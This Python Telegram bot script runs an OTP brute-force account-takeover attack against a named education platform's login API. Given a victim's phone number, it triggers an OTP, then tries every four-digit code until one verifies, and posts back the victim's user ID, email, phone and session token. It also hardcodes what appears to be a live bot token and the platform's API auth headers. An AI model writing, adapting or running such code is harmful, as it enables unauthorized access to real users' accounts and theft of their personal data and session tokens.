import requests
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext
import asyncio

# Global variables
headers = {
    "Client-Service": "Appx",
    "Auth-Key": "appxapi",
    "source": "windows"
}

check_user_url = "https://voraclassesapi.classx.co.in/get/check_user_exist"
send_otp_url = "https://voraclassesapi.classx.co.in/get/sendotp"
verify_otp_url = "https://voraclassesapi.classx.co.in/get/otpverify"

# Function to verify OTP
def verify_otp(number, otp, device_id):
    try:
        response = requests.get(
            verify_otp_url,
            headers=headers,
            params={"useremail": number, "otp": otp, "device_id": device_id}
        )
        verify_data = response.json()

        if response.status_code == 200 and verify_data.get("status") == 200:
            user = verify_data["user"]
            return {
                "otp": otp,
                "userid": user["userid"],
                "token": user["token"],
                "email": user["email"],
                "phone": user["phone"],
                "name": user["name"]
            }
        return None
    except Exception as e:
        print(f"Error verifying OTP {otp}: {e}")
        return None

# Function to check OTPs with progress bar
async def check_otps_sequentially(number, device_id, update: Update, context: CallbackContext):
    try:
        message = await update.message.reply_text("Checking number...")
        response = requests.get(check_user_url, headers=headers, params={"email_or_phone": number})
        response_data = response.json()

        if response.status_code == 200 and "data" in response_data and response_data["data"]:
            await message.edit_text("User exists. Sending OTP...")

            otp_response = requests.get(send_otp_url, headers=headers, params={"phone": number})
            otp_data = otp_response.json()

            if otp_response.status_code == 200 and "data" in otp_data:
                progress_message = await update.message.reply_text("OTP sent successfully. Checking OTPs...\nProgress:")

                total_otps = 9000
                start_time = time.time()
                total_otps_checked = 0
                last_otp_checked = 0

                # Sequentially check OTPs from 1000 to 9999
                for otp in range(1000, total_otps):
                    result = verify_otp(number, otp, device_id)
                    total_otps_checked += 1
                    last_otp_checked = otp

                    # Update progress message
                    elapsed_time = time.time() - start_time
                    time_left = int((elapsed_time / total_otps_checked) * (total_otps - total_otps_checked)) if total_otps_checked > 0 else 0
                    progress_text = (f"**Progress Bar**\n"
                                     f"Total OTPs Checked: {total_otps_checked}\n"
                                     f"Last OTP Checked: {last_otp_checked}\n"
                                     f"Estimated Time Left: {time_left}s")
                    await progress_message.edit_text(progress_text, parse_mode="Markdown")

                    if result:
                        await update.message.reply_text(
                            f"**Valid OTP Found!**\n\n"
                            f"**User Details:**\n"
                            f"Userid: {result['userid']}\n"
                            f"Phone: {result['phone']}\n"
                            f"Email: {result['email']}\n"
                            f"Token: {result['token']}\n"
                            f"Valid OTP: {result['otp']}",
                            parse_mode="Markdown"
                        )
                        return

                await update.message.reply_text("OTP not found in the range 1000-9999.")
            else:
                await message.edit_text(f"Failed to send OTP: {otp_data.get('message', 'Unknown error')}")
        else:
            await message.edit_text("User does not exist or an error occurred while checking.")
    except Exception as e:
        await update.message.reply_text(f"An error occurred: {str(e)}")

# Command to start the bot
async def start(update: Update, context: CallbackContext):
    await update.message.reply_text("Welcome! Please enter the phone number to check OTP.")

# Handle user input for phone number
async def handle_message(update: Update, context: CallbackContext):
    number = update.message.text
    if number.isdigit() and len(number) in [10, 12]:
        await update.message.reply_text(f"Checking OTP for phone number: {number}")
        device_id = "WebBrowser1734342653442cl8ld29gv5a"
        await check_otps_sequentially(number, device_id, update, context)
    else:
        await update.message.reply_text("Invalid phone number. Please enter a valid 10 or 12-digit phone number.")

def main():
    token = '7624523973:AAHpAGYWKIOVque5B6z9jzEMz1mQEgtdAjc'
    application = Application.builder().token(token).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.run_polling()

if __name__ == "__main__":
    main()
